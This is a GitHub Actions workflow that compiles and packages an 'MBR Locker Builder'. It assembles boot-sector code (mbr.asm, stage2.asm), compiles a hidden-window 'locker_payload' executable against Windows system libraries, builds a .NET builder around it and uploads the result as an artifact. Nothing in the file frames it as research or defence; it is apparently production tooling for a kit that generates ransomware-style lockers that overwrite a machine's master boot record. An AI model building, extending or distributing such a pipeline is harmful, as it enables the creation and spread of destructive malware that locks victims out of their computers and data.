name: Build MBR Locker Builder

on:
  push:
    branches: [ main ]
  workflow_dispatch:

jobs:
  build:
    runs-on: windows-latest

    steps:
    - name: Checkout code
      uses: actions/checkout@v4

    - name: Install NASM
      run: choco install nasm -y

    - name: Install MinGW
      run: |
        choco install mingw -y
        echo "C:\tools\mingw64\bin" | Out-File -FilePath $env:GITHUB_PATH -Encoding utf8 -Append

    - name: Copy locker.asm files
      shell: cmd
      run: |
        mkdir builder\Resources 2>nul
        copy locker\mbr.asm builder\Resources\mbr.asm
        copy locker\stage2.asm builder\Resources\stage2.asm
        echo [SUCCESS] ASM files copied

    - name: Setup .NET
      uses: actions/setup-dotnet@v4
      with:
        dotnet-version: 6.0.x

    - name: Compile Template
      shell: cmd
      run: |
        set PATH=C:\tools\mingw64\bin;%PATH%
        cd template
        g++ -static -O2 -mwindows locker_payload.cpp -o locker_payload.exe -luser32 -lkernel32 -ladvapi32 -lntdll
        if exist locker_payload.exe (
          copy locker_payload.exe ..\builder\Resources\template.exe
          echo [SUCCESS] Template compiled
        ) else (
          echo [ERROR] Compilation failed!
          exit /b 1
        )

    - name: Build Builder
      shell: cmd
      run: |
        cd builder
        dotnet restore
        dotnet build -c Release -o ../output

    - name: Upload Builder
      uses: actions/upload-artifact@v4
      with:
        name: MbrLockerBuilder
        path: |
          output/
          !output/*.pdb
        if-no-files-found: error
